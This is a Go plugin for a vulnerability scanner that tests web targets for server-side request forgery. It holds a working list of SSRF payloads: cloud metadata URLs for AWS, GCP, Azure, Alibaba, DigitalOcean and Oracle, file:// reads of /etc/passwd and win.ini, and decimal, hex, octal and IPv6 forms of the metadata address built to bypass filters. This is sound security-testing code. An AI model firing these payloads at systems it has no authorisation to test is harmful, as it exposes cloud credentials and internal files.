package plugins

import (
	"DORM/models"
	"fmt"
	"io"
	"strings"
)

type SSRFMetadataPlugin struct{}

func (p *SSRFMetadataPlugin) Name() string { return "SSRF Omni-Hunter (Cloud/Local/Bypass)" }

func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	params := []string{
		"url", "uri", "link", "dest", "redirect", "src", "source", "file",
		"u", "r", "document", "path", "pg", "view", "callback", "image_url",
	}

	// 2. PAYLOAD DICTIONARY
	// We map the payload URL to the expected signature string.
	type Payload struct {
		URL  string
		Sig  string // Signature to look for in 200 OK
		Desc string // Description for report
	}

	payloads := []Payload{

		{URL: "http://169.254.169.254/latest/meta-data/", Sig: "ami-id", Desc: "AWS Metadata"},
		{URL: "http://169.254.169.254/latest/user-data/", Sig: "#!/bin/bash", Desc: "AWS User Data (Scripts)"},
		{URL: "http://metadata.google.internal/computeMetadata/v1/", Sig: "Metadata-Flavor", Desc: "Google Cloud (Header Missing Error)"},
		{URL: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", Sig: "Required HTTP header", Desc: "Azure Metadata (Header Missing Error)"},
		{URL: "http://100.100.100.200/latest/meta-data/", Sig: "image-id", Desc: "Alibaba Cloud"},
		{URL: "http://169.254.169.254/metadata/v1/", Sig: "droplet_id", Desc: "DigitalOcean"},
		{URL: "http://192.0.0.192/latest/", Sig: "oracle", Desc: "Oracle Cloud"},

		{URL: "file:///etc/passwd", Sig: "root:x:0:0", Desc: "Local File Inclusion (LFI) via file://"},
		{URL: "file://C:/Windows/win.ini", Sig: "[fonts]", Desc: "Windows LFI via file://"},

		{URL: "http://2852039166/latest/meta-data/", Sig: "ami-id", Desc: "AWS Metadata (Decimal IP Bypass)"},
		{URL: "http://0xA9FEA9FE/latest/meta-data/", Sig: "ami-id", Desc: "AWS Metadata (Hex IP Bypass)"},
		{URL: "http://0251.0376.0251.0376/latest/meta-data/", Sig: "ami-id", Desc: "AWS Metadata (Octal IP Bypass)"},
		{URL: "http://[::ffff:a9fe:a9fe]/latest/meta-data/", Sig: "ami-id", Desc: "AWS Metadata (IPv6-Mapped Bypass)"},
	}

	for _, param := range params {
		for _, p := range payloads {

			attackURL := fmt.Sprintf("%s/?%s=%s", baseURL, param, p.URL)

			resp, err := client.Get(attackURL)
			if err != nil {
				continue
			}

			bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 10240))
			resp.Body.Close()
			body := string(bodyBytes)

			if resp.StatusCode == 200 && strings.Contains(body, p.Sig) {
				return &models.Vulnerability{
					Target:      target,
					Name:        "SSRF Detected (" + p.Desc + ")",
					Severity:    "CRITICAL",
					CVSS:        10.0,
					Description: fmt.Sprintf("Server fetched internal resource via parameter '%s'.\nPayload: %s\nEvidence Found: '%s'", param, p.URL, p.Sig),
					Solution:    "Validate and whitelist user inputs. Disable unused URL schemas (file://, gopher://). Enforce cloud metadata protection (IMDSv2).",
					Reference:   "CWE-918: Server-Side Request Forgery",
				}
			}

			if (resp.StatusCode == 400 || resp.StatusCode == 403) &&
				(strings.Contains(body, "Metadata-Flavor") || strings.Contains(body, "Required HTTP header")) {
				return &models.Vulnerability{
					Target:      target,
					Name:        "SSRF Detected (Cloud Error Leak)",
					Severity:    "HIGH",
					CVSS:        8.5,
					Description: fmt.Sprintf("The server tried to fetch Cloud Metadata but failed due to missing headers.\nThis CONFIRMS the SSRF models.Vulnerability exists.\nPayload: %s\nError Leak: %s", p.URL, body[:50]),
					Solution:    "The application is allowing requests to internal IPs (169.254.x.x). Implement a strict allowlist for outgoing connections.",
					Reference:   "CWE-918: Server-Side Request Forgery",
				}
			}
		}
	}

	return nil
}
